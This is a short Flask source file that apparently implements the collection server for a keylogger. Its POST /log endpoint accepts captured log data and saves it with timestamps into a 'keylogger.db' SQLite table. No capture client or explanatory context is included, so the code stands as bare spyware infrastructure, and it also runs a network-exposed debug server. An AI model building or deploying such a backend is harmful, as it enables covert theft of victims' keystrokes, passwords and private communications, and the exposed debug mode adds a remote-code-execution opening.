from flask import Flask, request, jsonify
import sqlite3
import datetime

app = Flask(__name__)

def create_db():
    conn = sqlite3.connect('keylogger.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS logs
                 (timestamp TEXT, log_data TEXT)''')
    conn.commit()
    conn.close()

def save_log_to_db(log_data):
    conn = sqlite3.connect('keylogger.db')
    c = conn.cursor()
    c.execute("INSERT INTO logs (timestamp, log_data) VALUES (?, ?)",
              (datetime.datetime.now(), log_data))
    conn.commit()
    conn.close()

@app.route('/log', methods=['POST'])
def log_key():
    data = request.json
    log_data = data.get("log")
    
    if log_data:
        save_log_to_db(log_data)
        return jsonify({"status": "success", "message": "Log saved!"}), 200
    else:
        return jsonify({"status": "error", "message": "No log data provided!"}), 400

if __name__ == '__main__':
    create_db()  
    app.run(debug=True, host="0.0.0.0", port=5000)
